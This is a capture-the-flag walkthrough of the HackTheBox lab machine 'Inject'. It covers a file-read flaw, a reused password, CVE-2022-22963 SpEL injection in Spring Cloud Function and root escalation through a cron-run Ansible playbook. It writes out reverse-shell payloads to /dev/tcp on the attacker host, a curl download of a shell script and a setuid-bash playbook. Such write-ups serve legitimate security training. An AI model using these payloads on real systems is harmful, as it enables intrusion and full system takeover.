---
maquina: "Inject"
dificultad: "Easy"
os: "Linux"
plataforma: "htb"
release: "11 Mar 2023"
retire: "08 Jul 2023"
creadores: "rajHere"
htb_url: "https://hackthebox.com/machines/inject"
app_url: "https://app.hackthebox.com/machines/533"
url: "https://0xdf.gitlab.io/2023/07/08/htb-inject.html"
tipo: "htb"
en_lista_oscp: false
oscp_seccion: ""
---

Inject has a website with a file read vulnerability that allows me to read the source code for the site. The source leaks that it’s using SpringBoot, and have a vulnerable library in use that allows me to get remote code execution. I’ll show how to identify this vulnerability both manually and using Snyk. The root step is about abusing a cron that’s running the Ansible automation framework.

## Recon

### nmap

`nmap` finds two open TCP ports, SSH (22) and HTTP (8080):

```console
oxdf@hacky$ nmap -p- --min-rate 10000 10.10.11.204
Starting Nmap 7.80 ( https://nmap.org ) at 2023-03-13 17:19 EDT
Nmap scan report for 10.10.11.204
Host is up (0.084s latency).
Not shown: 65533 closed ports
PORT     STATE SERVICE
22/tcp   open  ssh
8080/tcp open  http-proxy

Nmap done: 1 IP address (1 host up) scanned in 6.99 seconds
oxdf@hacky$ nmap -p 22,8080 -sCV 10.10.11.204
Starting Nmap 7.80 ( https://nmap.org ) at 2023-03-13 17:20 EDT
Nmap scan report for 10.10.11.204
Host is up (0.084s latency).

PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
8080/tcp open  nagios-nsca Nagios NSCA
|_http-title: Home
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 10.68 seconds
```

Based on the [OpenSSH](https://packages.ubuntu.com/search?keywords=openssh-server) version, the host is likely running Ubuntu 20.04 focal.

There’s no additional information about the web server running on 8080.

### Website - TCP 8080

#### Site

The site is for a cloud storage provider:

![image-20230313172233599](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20230313172233599.png)

Click for full image

The Blogs page (`/blogs`) has three articles:

![image-20230313172900444](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20230313172900444.png)

Click for full image

But clicking on them doesn’t go to anything.

Trying to register just gives an “Under Construction” message:

![image-20230313173054827](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20230313173054827.png)

At the top right of the page, there’s an upload link, which goes to `/upload`:

![image-20230313173320461](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20230313173320461.png)

If I try to upload a dummy text file, it rejects it:

![image-20230313173426299](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20230313173426299.png)

If I give it an image, it returns a link to that image:

![image-20230313174838711](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20230313174838711.png)

The link points at `/show_image?img=[uploaded image name]`.

#### Tech Stack

The HTTP headers show nothing interesting:

```http
HTTP/1.1 200
Content-Type: text/html;charset=UTF-8
Content-Language: en-US
Date: Mon, 13 Mar 2023 21:29:32 GMT
Connection: close
Content-Length: 6657
```

All of the URL paths end without an extension, and I’m not able to get `index.html` or `index.php` to load. The 404 page is interesting:

![image-20230313173718202](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20230313173718202.png)

Googling for that exact message returns a bunch of stuff about Tomcat:

![image-20230313173834603](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20230313173834603.png)

That suggests this is likely a Tomcat server, a Java-based web framework.

#### Directory Brute Force

I’ll run `feroxbuster` against the site:

```console
oxdf@hacky$ feroxbuster -u http://10.10.11.204:8080

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.8.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://10.10.11.204:8080
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.8.0
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
WLD        -         -         -         - http://10.10.11.204:8080 => auto-filtering 404-like response (4 words); toggle this behavior by using --dont-filter
200      GET      104l      194w     5654c http://10.10.11.204:8080/register
200      GET      166l      487w     6657c http://10.10.11.204:8080/
200      GET       54l      107w     1857c http://10.10.11.204:8080/upload
500      GET        1l        3w      106c http://10.10.11.204:8080/error
200      GET      112l      326w     5371c http://10.10.11.204:8080/blogs
500      GET        1l       27w      712c http://10.10.11.204:8080/environment
400      GET        1l       32w      435c http://10.10.11.204:8080/[
400      GET        1l       32w      435c http://10.10.11.204:8080/plain]
400      GET        1l       32w      435c http://10.10.11.204:8080/]
400      GET        1l       32w      435c http://10.10.11.204:8080/quote]
400      GET        1l       32w      435c http://10.10.11.204:8080/extension]
400      GET        1l       32w      435c http://10.10.11.204:8080/[0-9]
[####################] - 3m     30000/30000   0s      found:12      errors:0
[####################] - 3m     30004/30000   144/s   http://10.10.11.204:8080/
```

It doesn’t find anything I hadn’t already seen via manual enumeration.

## Shell as frank

### File Read / Directory Traversal

When I upload an image to the site, the link that comes back goes to `/show_image?img=[image name]`. In Burp, I can see that it’s returning the raw image:

![image-20230313175115351](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20230313175115351.png)

If I change `htb-desktop.png` to `.`, it lists the files in that directory:

![image-20230313175315092](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20230313175315092.png)

I can also perform a directory traversal to leave this directory:

![image-20230313175415503](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20230313175415503.png)

### File System Enumeration

#### Home Dirs

There are two home directories. `/home/frank` has the standard hidden files / directories, but also a `.m2` directory:

![image-20230313212935425](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20230313212935425.png)

It has a `settings.xml` file. The `settings.xml` file in a `.m2` directory in a user’s home directory is a configuration file used by Apache Maven, a popular build automation tool for Java projects. The `settings.xml` file contains settings that affect Maven’s behavior, such as the location of the local repository, the list of remote repositories to use, and authentication credentials for accessing remote repositories.

This file does have a password in it:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<settings xmlns="http://maven.apache.org/POM/4.0.0" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
        xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 https://maven.apache.org/xsd/maven-4.0.0.xsd">
  <servers>
    <server>
      <id>Inject</id>
      <username>phil</username>
      <password>DocPhillovestoInject123</password>
      <privateKey>${user.home}/.ssh/id_dsa</privateKey>
      <filePermissions>660</filePermissions>
      <directoryPermissions>660</directoryPermissions>
      <configuration></configuration>
    </server>
  </servers>
</settings>
```

This password doesn’t work for SSH as frank, phil, or root.

`/home/phil` has `user.txt`:

![image-20230313175654118](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20230313175654118.png)

The web user can’t read it.

#### Web Directory

`/var/www` has two directories in it, `html` and `WebApp`:

![image-20230313175805245](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20230313175805245.png)

`html` is empty (or inaccessible). `WebApp` has the root of a Java project:

![image-20230313175854360](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20230313175854360.png)

### Spring Cloud Function SpEL Injection

#### Manual Identification

A `pom.xml` file is a configuration file used in Java projects that helps manage dependencies and build processes. It contains information about the project, such as its name, version, and dependencies on other software libraries. For my uses, the contents of a pom.xml file allow me to see if the project is using any insecure or out of date libraries by looking at the dependencies listed in the file.

Here, the `pom.xml` file is:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<project xmlns="http://maven.apache.org/POM/4.0.0" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
    xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 https://maven.apache.org/xsd/maven-4.0.0.xsd">
    <modelVersion>4.0.0</modelVersion>
    <parent>
        <groupId>org.springframework.boot</groupId>
        <artifactId>spring-boot-starter-parent</artifactId>
        <version>2.6.5</version>
		<relativePath/> <!-- lookup parent from repository -->
    </parent>
    <groupId>com.example</groupId>
    <artifactId>WebApp</artifactId>
    <version>0.0.1-SNAPSHOT</version>
    <name>WebApp</name>
    <description>Demo project for Spring Boot</description>
    <properties>
        <java.version>11</java.version>
    </properties>
    <dependencies>
        <dependency>
              <groupId>com.sun.activation</groupId>
              <artifactId>javax.activation</artifactId>
              <version>1.2.0</version>
        </dependency>

        <dependency>
            <groupId>org.springframework.boot</groupId>
            <artifactId>spring-boot-starter-thymeleaf</artifactId>
        </dependency>
        <dependency>
            <groupId>org.springframework.boot</groupId>
            <artifactId>spring-boot-starter-web</artifactId>
        </dependency>

        <dependency>
            <groupId>org.springframework.boot</groupId>
            <artifactId>spring-boot-devtools</artifactId>
            <scope>runtime</scope>
            <optional>true</optional>
        </dependency>

        <dependency>
            <groupId>org.springframework.cloud</groupId>
            <artifactId>spring-cloud-function-web</artifactId>
            <version>3.2.2</version>
        </dependency>
        <dependency>
            <groupId>org.springframework.boot</groupId>
            <artifactId>spring-boot-starter-test</artifactId>
            <scope>test</scope>
        </dependency>
        <dependency>
            <groupId>org.webjars</groupId>
            <artifactId>bootstrap</artifactId>
            <version>5.1.3</version>
        </dependency>
        <dependency>
            <groupId>org.webjars</groupId>
            <artifactId>webjars-locator-core</artifactId>
        </dependency>

    </dependencies>
    <build>
        <plugins>
            <plugin>
                <groupId>org.springframework.boot</groupId>
                <artifactId>spring-boot-maven-plugin</artifactId>
                <version>${parent.version}</version>
            </plugin>
        </plugins>
        <finalName>spring-webapp</finalName>
    </build>

</project>
```

This file is all about [Spring Framework](https://spring.io/). My first thought is to check for [Spring4Shell (CVE-2022-22965)](https://www.trendmicro.com/en_us/research/22/d/cve-2022-22965-analyzing-the-exploitation-of-spring4shell-vulner.html), but it doesn’t appear that the necessary components are there (`spring-webmvc` or `spring-webflux`).

Digging a bit more into the libraries in this `pom.xml`, I’ll find CVE-2022-22963, which is referred to as [Spring Cloud Function SpEL Injection](https://nsfocusglobal.com/spring-cloud-function-spel-expression-injection-vulnerability-alert/), and is found in Spring Cloud Function before version 3.2.3. This site is running 3.2.2:

```xml
        <dependency>
            <groupId>org.springframework.cloud</groupId>
            <artifactId>spring-cloud-function-web</artifactId>
            <version>3.2.2</version>
        </dependency>
```

#### Snyk Identification

Alternatively, a tool like [Snyk](https://snyk.io/) can process the `pom.xml` file and report back any vulnerabilities in the dependencies. In most cases, it would be looking over an entire codebase to find potential vulnerabilities. Still one of the features, “Open Source Security”, analyzes files like a `pom.xml` that show what public resources are included, and identifies vulnerabilities there.

I’ll open VSCode and the directory containing my copy of the `pom.xml` file. At first, I wasn’t getting anything back, but that’s because my machine didn’t have Maven (the Java build system) installed, as seen in the Snyk output:

[![image-20230706133820912](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20230706133820912.png)
*Click for full size image*](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20230706133820912.png)

After running `sudo apt install maven`, it works, and shows several vulnerabilities, including CVE-2022-22963 as identified above:

![image-20230706134029158](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20230706134029158.png)

#### Scan

[This GitHub from dinosn](https://github.com/dinosn/CVE-2022-22963/blob/main/poc.py) has a simple POC to scan for CVE-2022-22963. This script takes a list of urls, and loops over them in threads. For each, it sends an HTTP POST request, and if the response code is 500, the result is success:

```python
    for  url  in  urllist :
        url = url.strip('\n')
        all = url + path
        try:
            req=requests.post(url=all,headers=headers,data=data,verify=False,timeout=3)
            code =req.status_code
            text = req.text
            rsp = '"error":"Internal Server Error"'

            if code == 500 and rsp in text:
                print ( f'[+] { url } is vulnerable' )
                poc_file = open('vulnerable.txt', 'a+')
                poc_file.write(url + '\n')
                poc_file.close()
            else:
                print ( f'[-] { url } not vulnerable' )
```

A bit before that, it sets the data that will be sent:

```python
    payload=f'T(java.lang.Runtime).getRuntime().exec("{cmd}")'

    data ='test'
    headers = {
        'spring.cloud.function.routing-expression':payload,
        'Accept-Encoding': 'gzip, deflate',
        'Accept': '*/*',
        'Accept-Language': 'en',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36',
        'Content-Type': 'application/x-www-form-urlencoded'
    }
    path = '/functionRouter'
```

Execution appears to be in a specially formatted `spring.cloud.function.routing-expression` header.

I’ll try sending this request, and it does crash:

![image-20230313183004040](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20230313183004040.png)

It does seem on Inject that anything I send to this endpoint crashes, so it’s not clear to me that this is vulnerable yet.

#### POC

To test for execution, I’ll replace `sleep` with `ping -c 1 10.10.14.6` to send one ICMP ping to my host. I’ll listen with `tcpdump` filtering for ICMP traffic on my `tun0` interface. When I submit the HTTP request, there’s a ping!

```console
oxdf@hacky$ sudo tcpdump -ni tun0 icmp
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
18:31:17.026312 IP 10.10.11.204 > 10.10.14.6: ICMP echo request, id 2, seq 1, length 64
18:31:17.026319 IP 10.10.14.6 > 10.10.11.204: ICMP echo reply, id 2, seq 1, length 64
```

### Shell

#### Failures

This is blind execution (the response is just a 500 error, without the output of the result). I’ll try a [bash reverse shell](https://www.youtube.com/watch?v=OjkVep2EIlw), but with the special characters in that, it’s likely to not work:

![image-20230313183519151](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20230313183519151.png)

There’s no connection at my `nc` listening on 443.

I’ll encode the payload with Base64:

```console
oxdf@hacky$ echo 'bash -i >& /dev/tcp/10.10.14.6/443 0>&1' | base64 -w0
YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC42LzQ0MyAwPiYxCg==
```

With a couple extra spaces I can get rid of the special characters (`+` and `=`):

```console
oxdf@hacky$ echo ' bash -i >& /dev/tcp/10.10.14.6/443 0>&1' | base64 -w0
IGJhc2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuNi80NDMgMD4mMQo=
oxdf@hacky$ echo ' bash -i >& /dev/tcp/10.10.14.6/443 0>&1 ' | base64 -w0
IGJhc2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuNi80NDMgMD4mMSAK
```

I can try that as well by sending this:

![image-20230313184201736](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20230313184201736.png)

It still doesn’t connect.

#### Success By curl

My original solve was to try to use `curl` to request a payload from my host and pipe that into `bash`.

![image-20230313184312048](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20230313184312048.png)

I’ll set up a Python webserver (`python -m http.server 80`) and send this request. There is a request back to my server, but it’s for `/shell.sh|bash`:

```console
oxdf@hacky$ python -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.11.204 - - [13/Mar/2023 18:40:40] code 404, message File not found
10.10.11.204 - - [13/Mar/2023 18:40:40] "GET /shell.sh|bash HTTP/1.1" 404 -
```

The `|` is being interpreted as part of the path. Instead, I can save the file in `/tmp`:

```http
POST /functionRouter HTTP/1.1
spring.cloud.function.routing-expression: T(java.lang.Runtime).getRuntime().exec("curl 10.10.14.6/shell.sh -o /tmp/0xdf.sh")
Host: 10.10.11.204:8080
...[snip]...
```

And then send another request to run it:

```http
POST /functionRouter HTTP/1.1
spring.cloud.function.routing-expression: T(java.lang.Runtime).getRuntime().exec("bash /tmp/0xdf.sh")
Host: 10.10.11.204:8080
...[snip]...
```

At `nc`, there’s a shell:

```console
oxdf@hacky$ nc -lnvp 443
Listening on 0.0.0.0 443
Connection received on 10.10.11.204 60606
bash: cannot set terminal process group (820): Inappropriate ioctl for device
bash: no job control in this shell
frank@inject:/$
```

#### Success by Brace Expansion

[Brace expansion](https://www.gnu.org/software/bash/manual/html_node/Brace-Expansion.html) is something I use daily in `bash`. For example, when I need to move `file_20230313-2046.png` to `file_20230313-2046-orig.png`, I’ll do:

```console
$ mv file_20230313-2046{,-orig}.png
```

When I submit a payload like this:

```java
T(java.lang.Runtime).getRuntime().exec("bash -c {echo,IGJhc2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuNi80NDMgMD4mMSAK}|{base64,-d}|bash")
```

Bash expands that to:

```java
T(java.lang.Runtime).getRuntime().exec("bash -c echo IGJhc2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuNi80NDMgMD4mMSAK|base64 -d|bash")
```

Whatever was causing it to fail in the Java layer doesn’t fail any more, and now it works!

#### Shell Upgrade

I’ll [upgrade my shell](https://www.youtube.com/watch?v=DqE6DxqJg8Q) using the `script` / `stty` technique:

```console
frank@inject:/$ script /dev/null -c bash\
Script started, file is /dev/null
frank@inject:/$ ^Z
[1]+  Stopped                 nc -lnvp 443
oxdf@hacky$ stty raw -echo; fg
nc -lnvp 443
            reset
reset: unknown terminal type unknown
Terminal type? screen
frank@inject:/$
```

## Shell as phil

With the file read in the website I already found a password, “DocPhillovestoInject123”. That password didn’t work for SSH as phil:

```console
oxdf@hacky$ sshpass -p 'DocPhillovestoInject123' ssh phil@10.10.11.204
Permission denied, please try again.
```

But it does work to `su` as phil:

```console
frank@inject:~$ su - phil
Password:
phil@inject:~$
```

So why can’t phil connect over SSH? They are explicitly denied in the SSHd config (using `grep -v ^#` to remove lines that start with a comment and `grep .` to select non-blank lines):

```console
phil@inject:~$ cat /etc/ssh/sshd_config|grep -v ^# | grep .
Include /etc/ssh/sshd_config.d/*.conf
DenyUsers phil
ChallengeResponseAuthentication no
UsePAM yes
X11Forwarding yes
PrintMotd no
AcceptEnv LANG LC_*
Subsystem       sftp    /usr/lib/openssh/sftp-server
```

With a shell as phil, I can get `user.txt`:

```console
phil@inject:~$ cat user.txt
4a256f61************************
```

## Shell as root

### Enumeration

#### Automation

There’s a single file in `/opt`:

```console
phil@inject:~$ find /opt/ -type f
/opt/automation/tasks/playbook_1.yml
```

It’s a yaml file that is describing tasks:

```yml
- hosts: localhost
  tasks:
  - name: Checking webapp service
    ansible.builtin.systemd:
      name: webapp
      enabled: yes
      state: started
```

I’ll ask ChatGPT what this file is, and it identifies it immediately:

![image-20230313213946016](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20230313213946016.png)

[Ansible](https://www.ansible.com/) is an open-source automation tool that simplifies the process of managing and configuring IT infrastructure. As ChatGPT identified, this one makes sure that the webapp service is running through systemd.

#### Processes

I’ll use [pspy](https://github.com/DominicBreuker/pspy) to check for running processes on the host. I’ll download the latest release from their [release page](https://github.com/DominicBreuker/pspy/releases/tag/v1.2.1) (1.2.1 at the time of solving), host it with a Python webserver, and fetch it to Inject with `wget`:

```console
phil@inject:/tmp$ wget 10.10.14.6/pspy64
--2023-03-14 01:43:58--  http://10.10.14.6/pspy64
Connecting to 10.10.14.6:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 3104768 (3.0M) [application/octet-stream]
Saving to: ‘pspy64’

pspy64              100%[===================>]   2.96M  4.14MB/s    in 0.7s

2023-03-14 01:43:59 (4.14 MB/s) - ‘pspy64’ saved [3104768/3104768]
```

I’ll make it executable and run it:

```console
phil@inject:/tmp$ chmod +x pspy64
phil@inject:/tmp$ ./pspy64
pspy - version: v1.2.1 - Commit SHA: f9e6a1590a4312b9faa093d8dc84e19567977a6d

     ██▓███    ██████  ██▓███ ▓██   ██▓
    ▓██░  ██▒▒██    ▒ ▓██░  ██▒▒██  ██▒
    ▓██░ ██▓▒░ ▓██▄   ▓██░ ██▓▒ ▒██ ██░
    ▒██▄█▓▒ ▒  ▒   ██▒▒██▄█▓▒ ▒ ░ ▐██▓░
    ▒██▒ ░  ░▒██████▒▒▒██▒ ░  ░ ░ ██▒▓░
    ▒▓▒░ ░  ░▒ ▒▓▒ ▒ ░▒▓▒░ ░  ░  ██▒▒▒
    ░▒ ░     ░ ░▒  ░ ░░▒ ░     ▓██ ░▒░
    ░░       ░  ░  ░  ░░       ▒ ▒ ░░
                   ░           ░ ░
                               ░ ░
...[snip]...
```

Every even minute there’s a flurry of activity, starting with:

```console
2023/03/14 01:46:01 CMD: UID=0     PID=18659  | /bin/sh -c /usr/local/bin/ansible-parallel /opt/automation/tasks/*.yml
2023/03/14 01:46:01 CMD: UID=0     PID=18658  | /usr/sbin/CRON -f
2023/03/14 01:46:01 CMD: UID=0     PID=18657  | /usr/sbin/CRON -f
2023/03/14 01:46:01 CMD: UID=0     PID=18656  | /usr/sbin/CRON -f                                                                   2023/03/14 01:46:01 CMD: UID=0     PID=18655  | /usr/sbin/CRON -f
2023/03/14 01:46:01 CMD: UID=0     PID=18660  | /bin/sh -c /usr/local/bin/ansible-parallel /opt/automation/tasks/*.yml              2023/03/14 01:46:01 CMD: UID=0     PID=18661  | /usr/sbin/CRON -f
2023/03/14 01:46:01 CMD: UID=0     PID=18662  | sleep 10
```

root is running `ansible-parallel` on `*.yaml` in `/opt/automation/tasks`.

#### staff

The `tasks` folder is owned by root, and writable by the staff group:

```console
phil@inject:/opt/automation$ ls -l
total 4
drwxrwxr-x 2 root staff 4096 Mar 14 01:46 tasks
```

phil is in the staff group:

```console
phil@inject:/opt/automation$ id
uid=1001(phil) gid=1001(phil) groups=1001(phil),50(staff)
```

Which means that phil can write to this folder:

```console
phil@inject:/opt/automation/tasks$ touch 0xdf
phil@inject:/opt/automation/tasks$ ls
0xdf  playbook_1.yml
```

### Execution Via Ansible

The simplest way to run some command via Ansible is with the built-in [Shell module](https://docs.ansible.com/ansible/latest/collections/ansible/builtin/shell_module.html). I’ll make a file that’s as simple as:

```yml
- hosts: localhost
  tasks:
  - name: '0xdf owns inject'
    shell: cp /bin/bash /tmp/0xdf; chmod 4755 /tmp/0xdf
```

I’ll save this as `/opt/automation/tasks/0xdf.yml`. When the cron runs, there’s a new file in `/tmp`:

```console
phil@inject:/opt/automation/tasks$ ls -l /tmp/0xdf
-rwsr-xr-x 1 root root 1183448 Mar 14 12:58 /tmp/0xdf
```

This is a copy of `bash` that’s owned by root with the SetUID bit enabled. So when I run this (with `-p` to maintain privs), I get a shell as root:

```console
phil@inject:/opt/automation/tasks$ /tmp/0xdf -p
0xdf-5.0# id
uid=1001(phil) gid=1001(phil) euid=0(root) groups=1001(phil),50(staff)
```

More specifically, it’s with effective userid of 0 / root (check out [this post](https://0xdf.gitlab.io/2022/05/31/setuid-rabbithole.html) for a detailed breakdown of what’s happening here). Regardless, I can read `root.txt`:

```console
0xdf-5.0# cat root.txt
e6e4cee7************************
```
